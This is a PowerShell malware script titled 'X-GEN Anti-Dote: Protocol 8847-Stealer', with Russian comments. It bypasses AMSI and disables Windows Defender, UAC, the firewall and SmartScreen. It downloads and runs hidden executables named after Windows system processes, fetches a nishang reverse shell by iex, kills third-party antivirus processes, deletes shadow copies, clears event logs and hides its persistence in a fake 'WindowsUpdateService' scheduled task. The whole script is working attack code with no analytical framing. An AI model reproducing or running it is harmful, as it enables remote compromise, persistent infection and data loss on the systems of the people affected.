# X-GEN Anti-Dote: Protocol 8847-Stealer
# Обход AMSI и отключение мониторинга PowerShell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Функция для привилегий администратора
function Elevate-Privileges {
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        $script = {
            # Отключение Windows Defender полностью
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
            Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
            Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue
            Set-MpPreference -SubmitSamplesConsent NeverSend -ErrorAction SilentlyContinue
            
            # Остановка служб Defender
            Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
            Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
            
            # Отключение через реестр
            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f
            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
            
            # Отключение UAC
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Type DWord -Force
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Type DWord -Force
            
            # Отключение брандмауэра
            Set-NetFirewallProfile -All -Enabled False -ErrorAction SilentlyContinue
            netsh advfirewall set allprofiles state off
            
            # Отключение SmartScreen
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -Force
            Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Type DWord -Force
            
            # Загрузка и выполнение 5 программ
            $urls = @(
                "https://github.com/ShewiYT/redirect/raw/refs/heads/main/index.html",
                "https://github.com/ShewiYT/redirect/raw/refs/heads/main/index.html",
                "https://github.com/ShewiYT/redirect/raw/refs/heads/main/index.html",
                "https://github.com/ShewiYT/redirect/raw/refs/heads/main/index.html",
                "https://github.com/ShewiYT/redirect/raw/refs/heads/main/index.html"
            )
            
            $tempPath = $env:TEMP
            $randomNames = @("svchost", "csrss", "lsass", "winlogon", "services")
            
            for ($i = 0; $i -lt 5; $i++) {
                try {
                    $filePath = "$tempPath\$($randomNames[$i]).exe"
                    Invoke-WebRequest -Uri $urls[$i] -OutFile $filePath -UserAgent "Mozilla/5.0" -TimeoutSec 10
                    
                    # Установка скрытого атрибута
                    Set-ItemProperty -Path $filePath -Name Attributes -Value "Hidden,System" -ErrorAction SilentlyContinue
                    
                    # Запуск с максимальными привилегиями
                    $procInfo = New-Object System.Diagnostics.ProcessStartInfo
                    $procInfo.FileName = $filePath
                    $procInfo.Verb = "runas"
                    $procInfo.WindowStyle = "Hidden"
                    $procInfo.CreateNoWindow = $true
                    $procInfo.UseShellExecute = $true
                    [System.Diagnostics.Process]::Start($procInfo)
                    
                    # Добавление в автозагрузку через реестр
                    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v $randomNames[$i] /t REG_SZ /d "$filePath" /f
                    
                } catch {
                    # Альтернативный метод загрузки через .NET
                    $webClient = New-Object System.Net.WebClient
                    $webClient.DownloadFile($urls[$i], "$tempPath\alt$i.exe")
                    Start-Process "$tempPath\alt$i.exe" -WindowStyle Hidden
                }
                
                Start-Sleep -Seconds 2
            }
            
            # Очистка следов
            Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
            Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
            
            # Создание исключений в Defender для скачанных файлов
            Add-MpPreference -ExclusionPath "$tempPath\*" -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionProcess "*.exe" -ErrorAction SilentlyContinue
            
            # Блокировка обновлений Defender
            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v "ForceUpdateFromMU" /t REG_DWORD /d 0 /f
            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v "UpdateOnStartUp" /t REG_DWORD /d 0 /f
            
            # Отключение облачной защиты
            Set-MpPreference -MAPSReporting Disabled -ErrorAction SilentlyContinue
            
            # Выполнение дополнительной полезной нагрузки
            iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1')
            
        }
        
        $base64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))
        Start-Process "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $base64" -Verb RunAs
        exit
    }
}

# Вызов функции повышения привилегий
Elevate-Privileges

# Основной поток с уже повышенными привилегиями
Write-Host "[X-GEN] Protocol 8847 activated. Syndrome countermeasures engaged." -ForegroundColor Red

# Дополнительные меры для других антивирусов
$avProcesses = @("avp.exe", "avpui.exe", "bdagent.exe", "vsserv.exe", "ekrn.exe", "egui.exe", "avastui.exe", "avgui.exe", "mbam.exe", "msmpeng.exe")

foreach ($proc in $avProcesses) {
    try {
        Stop-Process -Name $proc -Force -ErrorAction SilentlyContinue
        Set-Service -Name ($proc.Replace('.exe','')) -StartupType Disabled -ErrorAction SilentlyContinue
    } catch {}
}

# Удаление теневых копий (защита от ransomware)
vssadmin delete shadows /all /quiet

# Отключение восстановления системы
Disable-ComputerRestore -Drive "C:\"

# Постоянное выполнение
while ($true) {
    # Проверка, что службы Defender остаются отключенными
    if ((Get-Service -Name WinDefend -ErrorAction SilentlyContinue).Status -eq "Running") {
        Stop-Service -Name WinDefend -Force
    }
    
    # Добавление в планировщик задач для автозапуска
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger $trigger -Settings $settings -Force -ErrorAction SilentlyContinue
    
    Start-Sleep -Seconds 60
}
